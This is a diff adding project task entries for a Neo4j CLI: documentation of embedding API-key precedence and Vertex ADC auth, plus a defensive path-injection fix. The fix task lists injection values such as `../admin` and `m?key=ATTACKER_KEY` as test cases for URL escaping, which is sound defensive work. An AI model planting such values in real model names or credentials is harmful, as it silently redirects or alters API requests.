+         `GEMINI_API_KEY` and `GOOGLE_API_KEY`. Suggested wording:
+         ```
+         | API key | (none — see below) | `NEO4J_EMBED_API_KEY`,
+         `OPENAI_API_KEY`, `HF_TOKEN`, `GEMINI_API_KEY`,
+         `GOOGLE_API_KEY` |
+         ```
+
+      2. Rewrite the precedence prose so it explicitly covers gemini
+         and notes vertex's ADC path. Suggested:
+         ```
+         API-key precedence (highest first): per-provider OS env
+         (`OPENAI_API_KEY` for openai; `HF_TOKEN` for huggingface;
+         `GEMINI_API_KEY` then `GOOGLE_API_KEY` for gemini) →
+         generic OS env (`NEO4J_EMBED_API_KEY`) → per-provider `.env`
+         value → generic `.env` value → stored credential `api-key`.
+         Ollama needs no API key. Vertex AI does not use an API key
+         at all — it authenticates via Application Default
+         Credentials (`gcloud auth application-default login` or
+         `GOOGLE_APPLICATION_CREDENTIALS` pointing at a service-
+         account JSON), so the API-key precedence rules above do not
+         apply when `--embed-provider vertex`.
+         ```
+
+      Match the existing tone and concision. This is the
+      authoritative reference for env-var setup; agents and humans
+      both look at this section first.
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "README's API-key table row lists `GEMINI_API_KEY` and `GOOGLE_API_KEY` alongside the existing env vars"
+      - "README's precedence prose explicitly names the gemini env chain"
+      - "README's precedence prose says vertex authenticates via ADC and does not use API-key precedence"
+      - "No skill-bundle regeneration needed (README is not part of the bundle)"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+    source: review
+    completed_at: 2026-05-28T17:15:00Z
+
+  - id: task-018
+    title: "Update SKILL.md embed-config tip to cover gemini env chain + vertex ADC"
+    description: |
+      The single most-read tip in the skill bundle about embedding
+      setup is at `neo4j-cli/internal/skill/additions.md:17` (which
+      flows into `bundle/SKILL.md:52` via `go generate`). Current
+      content:
+
+      ```
+      Embedding config (`--embed-provider`, `--embed-model`,
+      `--embed-base-url`, `--embed-dimensions`) resolves with the
+      same precedence as connection config: flag > OS env
+      (`NEO4J_EMBED_*`) > `.env` walk-up > stored embed credential.
+      API keys layer per provider: `OPENAI_API_KEY` / `HF_TOKEN`
+      (per-provider) beats `NEO4J_EMBED_API_KEY` (generic) beats the
+      stored credential. Ollama needs no API key.
+      ```
+
+      Two gaps for an agent picking this tip up:
+      - No mention of `GEMINI_API_KEY` / `GOOGLE_API_KEY` for gemini
+      - No mention of vertex's ADC auth path, the required
+        `--vertex-project` / `--vertex-location` flags, or that
+        vertex skips the API-key chain entirely.
+
+      Fix: rewrite the second sentence onward to cover all five
+      providers. Suggested shape (keep the bullet a single tight
+      paragraph — these tips are deliberately dense):
+
+      ```
+      API keys layer per provider: `OPENAI_API_KEY` (openai),
+      `HF_TOKEN` (huggingface), `GEMINI_API_KEY` then
+      `GOOGLE_API_KEY` (gemini) — all beating `NEO4J_EMBED_API_KEY`
+      (generic) and the stored credential's `api-key`. Ollama needs
+      no API key. Vertex AI uses Application Default Credentials
+      (`gcloud auth application-default login` or
+      `GOOGLE_APPLICATION_CREDENTIALS`), takes no `--api-key`, and
+      requires `--vertex-project` + `--vertex-location` (stored on
+      the credential — no per-query flag override).
+      ```
+
+      After the edit, regenerate the skill bundle with
+      `go generate ./neo4j-cli/internal/skill/...`. The tip flows
+      into `bundle/SKILL.md` automatically. `TestGenerator_RoundTrip`
+      is the gate.
+
+      No new tests; this is doc content picked up by the existing
+      round-trip gate.
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "`additions.md` embed-config tip names `GEMINI_API_KEY` / `GOOGLE_API_KEY` in the per-provider env chain"
+      - "Tip explicitly states vertex uses ADC and skips the API-key chain"
+      - "Tip mentions `--vertex-project` + `--vertex-location` are stored-cred-only"
+      - "Skill bundle regenerated; `bundle/SKILL.md` reflects the new tip"
+      - "`TestGenerator_RoundTrip` passes"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+    source: review
+    completed_at: 2026-05-28T17:30:00Z
+
+  - id: task-019
+    status: completed
+    title: "url.PathEscape Model in gemini and vertex URL construction (path injection fix)"
+    description: |
+      Inline PR review comment from `claude[bot]` on PR #186 flagged a
+      Low-severity path injection in the gemini and vertex providers:
+
+      > `p.cfg.Model` is concatenated directly into the URL path
+      > without encoding. A model name containing `..` silently
+      > changes which endpoint is called on the same API host — e.g.
+      > `../admin` normalises to `/admin:embedContent` — and a `?` in
+      > the name (`m?key=x`) drops the `:embedContent` suffix into a
+      > query value, producing the wrong API call.
+      > `urlcheck.ValidateRemoteURL` only checks scheme+host, not
+      > the path, so neither shape is caught.
+
+      Affected lines:
+      - `neo4j-cli/query/embed/gemini.go:97` →
+        `url := base + "/models/" + p.cfg.Model + ":embedContent"`
+      - `neo4j-cli/query/embed/vertex.go:169` →
+        `... "/publishers/google/models/" + p.cfg.Model + ":predict"`
+
+      Threat model: Model is user-controlled (flag, env, .env, or
+      stored credential). The user shoots their own foot — but defense
+      in depth says the provider shouldn't construct a
+      wrong-host-but-correct-looking URL from a stored value. A
+      planted credential with `--embed-model 'm?key=ATTACKER_KEY'`
+      would alter the request shape silently.
+
+      Fix: wrap `p.cfg.Model` in `url.PathEscape(...)` at both call
+      sites. `url.PathEscape` encodes `/` → `%2F`, `?` → `%3F`, `#`
+      → `%23`, so:
+      - `../admin` → `..%2Fadmin` — a literal path segment, doesn't
+        traverse.
+      - `m?key=x` → `m%3Fkey%3Dx` — `?` encoded, can't start a query
+        string.
+      - `m#frag` → `m%23frag` — `#` encoded, can't start a fragment.
+
+      The literal `:embedContent` / `:predict` suffixes stay OUTSIDE
+      the `PathEscape` call so the `:` colons remain literal in the
+      URL path (per Google's API convention these are method
+      indicators, not segment separators).
+
+      Tests (add to existing `gemini_test.go` and `vertex_test.go`):
+
+      1. Model = `../admin` — assert the captured request URL path
+         contains `models/..%2Fadmin:embedContent` (gemini) /
+         `models/..%2Fadmin:predict` (vertex), NOT `/admin`.
+      2. Model = `m?key=x` — assert the captured request URL path
+         contains `models/m%3Fkey%3Dx:embedContent` /
+         `models/m%3Fkey%3Dx:predict`, NOT a request whose RawQuery
+         contains `key=x`.
+
+      The existing httptest harness records the inbound request URL
+      via `r.URL.Path` and `r.URL.RawQuery` — inspect those in the
+      handler.
+
+      Two table rows per provider is sufficient; this is a narrow
+      defense-in-depth fix.
+    dependencies: []
+    acceptance_criteria:
+      - "`gemini.go` Embed wraps `p.cfg.Model` in `url.PathEscape` when building the request URL"
+      - "`vertex.go` Embed wraps `p.cfg.Model` in `url.PathEscape` when building the request URL"
+      - "`gemini_test.go` covers Model = `../admin` and Model = `m?key=x`, asserting the captured path is escaped and the upstream endpoint is unchanged"
+      - "`vertex_test.go` covers the same two attack values"
+      - "Existing happy-path tests still pass unmodified (legitimate model names like `gemini-embedding-001` contain no characters that PathEscape touches)"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+      - "`make generate-check` still passes (no bundle drift expected — this is a code-internal change)"
+    source: review
+    completed_at: 2026-05-28T18:30:00Z
